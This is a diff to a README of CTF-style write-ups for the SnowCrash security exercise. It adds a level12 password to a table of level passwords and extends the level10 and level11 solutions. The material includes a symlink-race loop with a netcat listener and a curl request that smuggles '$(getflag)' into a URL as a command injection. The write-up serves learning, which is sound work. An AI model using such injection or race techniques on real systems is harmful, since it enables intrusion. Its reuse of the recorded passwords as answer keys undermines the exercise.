@@ -23,6 +23,7 @@ This project will be an introduction to cyber security.
 | level10 | s5cAJpM8ev6XHw998pRWG728z |
 | flag10  | woupa2yuojeeaaed06riuj63c |
 | level11 | feulo4b72j7edeahuete3no7c |
+| level12 | fa6v5ateaw21peobuub8ipe6s |
 
 ## Script
 
@@ -152,8 +153,8 @@ for i in $(seq 1 10000); do rm -f toto && ln -s token toto && rm -f toto && echo
 ```bash
 for i in $(seq 1 10000); do ./level10 toto 127.0.0.1; done
 ```
-
-```bash
+It will eventually give :
+```
 level10@SnowCrash:~$ for i in $(seq 1 10000); do netcat -lv 6969 2>&1 | grep -v "Connection\|toto\|.*( )*."; done
 woupa2yuojeeaaed06riuj63c
 level10@SnowCrash:~$ su flag10
@@ -161,4 +162,12 @@ Password:
 Don't forget to launch getflag !
 flag10@SnowCrash:~$ getflag
 Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+```
+
+### level11
+
+```bash
+level11@SnowCrash:~$ curl localhost:5151/'$(getflag) > /tmp/flag' && cat /tmp/flag
+Password: Erf nope..
+GET /Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s HTTP/1.1
 ```
